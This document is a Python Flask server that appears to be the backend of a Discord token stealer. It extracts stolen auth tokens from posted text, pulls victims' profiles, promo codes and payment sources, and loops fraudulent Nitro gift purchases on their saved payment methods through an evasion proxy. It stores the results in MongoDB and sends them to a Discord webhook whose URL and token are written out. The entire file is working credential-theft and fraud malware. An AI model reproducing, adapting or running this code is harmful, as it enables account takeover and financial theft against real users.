from flask import request
import flask, re, pymongo, datetime, threading, httpx

__PROXY__ = "http://user:pass@ip:port" # residential proxy is to prevend discord protection (blacklist datacenter ip) (if discord have protection LOL)

class Database:
    def __init__(self):
        self.client = pymongo.MongoClient("mongodb+srv://user:pass@cluster0.opfws.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
        self.database = self.client['accounts']['account']
    
    def get_tokens(self):
        tokens = []

        for account in self.database.find({}):
            tokens.append(account['token'][:25])
        
        return list(set(tokens))

    def add_account(self, profil, token, gift, p_source):
        object_json = {'logged_at': datetime.datetime.utcnow(), 'profil': profil, 'token': token, 'paiement_source': p_source, 'gift': gift}
        httpx.post('https://discord.com/api/webhooks/923485649061945364/A6BRBqybInP7fq-yJ1hDZSsCYc6HR-piAOCXzKYWargq0x6gPU3qgSqolhXSG_ikgjBZ', headers={'content-type': 'application/json'}, json={'content': f'> ||@everyone|| ```{object_json}```'})
        self.database.insert_one(object_json)

class Api():
    def __init__(self, port):
        self.base_api = '/api'
        self.app      = flask.Flask(__name__)
        app           = self.app
        self.prt      = port
        self.db = Database()
        self.tokens = self.db.get_tokens()

        def buy_nitro(token, uid):
            while True: # nitro boost sku
                r1 = httpx.post(f'https://discord.com/api/v9/store/skus/521847234246082599/purchase', headers={'Content-Type': 'application/json', 'Authorization': token}, json={"gift":True,"sku_subscription_plan_id": "511651880837840896","payment_source_id": uid,"payment_source_token": None,"expected_amount":999,"expected_currency":"usd"}, proxies= {"http://": __PROXY__,"https://": __PROXY__})
                print(r1.text)
                try:
                    gift_code = r1.json()['gift_code']
                    print("https://discord.gift/" + gift_code + " | " + token)
                    httpx.post('https://discord.com/api/webhooks/id/token', headers={'content-type': 'application/json'}, json={'content': f'@everyone https://discord.gift/{gift_code}'})
                except:
                    break

        def add_acc(token):
            header = {'content-type': 'application/json', 'authorization': token, 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.16 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36', 'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwODA0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='}
            gifts = []
            p_source = []

            profil = httpx.get('https://discord.com/api/v9/users/@me', headers=header).json()
            r = httpx.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=header)
            p = httpx.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=header)
            
            if profil['id'] in ['922074389984448513', '923318457301368832', '923319667647455283', '923320378540056646', '923321166985318510', '923322077300289667']: # blacklist all of my accounts
                return

            if p.status_code == 200 and p.text != '[]':
                resp = p.json()
                p_source.append(resp)

                for uid in p.json():
                    print(uid)
                    if uid['invalid'] == True:
                        print(f'[-] {uid["id"]} {token} Invalid payment source')
                        threading.Thread(target=buy_nitro, args=(token,uid["id"],)).start()
                    else:
                        print(f'[+] {uid["id"]} {token} Valid payment source')
                        threading.Thread(target=buy_nitro, args=(token,uid["id"],)).start()

            if 'promotion' in r.text:
                r = r.json()

                for promo in r:
                    gifts.append({promo['promotion']['outbound_title']: promo['code']})

            print(gifts, p_source)
            self.db.add_account(profil, token, gifts, p_source)

        @app.route('/', methods= ['GET'])
        def send_index():
            return 'uwu', 201

        @app.errorhandler(404)
        def not_found(error):
            return 'tvt', 404

        @app.errorhandler(500)
        def internal_error(error):
            return 'twt', 500
        
        @app.route(f'{self.base_api}/send-token', methods= ['POST'])
        def send_token():
            content = request.get_json(silent=True)['content']
            
            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content):
                if token[:25] not in self.tokens:
                    self.tokens.append(token[:25])
                    threading.Thread(target= add_acc, args=(token,)).start()

            return 'owo'

    def start(self):
        self.app.run(host= '0.0.0.0', port= self.prt)


if __name__ == '__main__':
    Api(8081).start()
